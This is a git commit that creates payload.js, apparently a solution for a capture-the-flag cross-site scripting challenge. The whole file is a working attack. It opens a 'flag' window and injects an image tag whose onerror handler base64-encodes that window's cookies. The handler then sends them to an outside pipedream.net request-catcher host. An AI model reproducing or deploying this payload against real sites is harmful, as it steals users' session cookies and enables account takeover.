a770b80d9441de8091d5380641b4e8ae74899184
Abdul Haq <75989562+skabdulhaq@users.noreply.github.com>
2023-02-26 23:00:53 +0530

    Create payload.js

---
+++ payload.js
@@ -0,0 +1,6 @@
+console.log('execution started')
+flag = window.open("flag")
+flag.window.onload = () =>{
+    flag.window.document.write(`<img src=x onerror="fetch('https://eoctl0knzoys9l9.m.pipedream.net/?flag=${btoa(flag.window.document.cookie)}')">`)
+}
+console.log('execution ended')
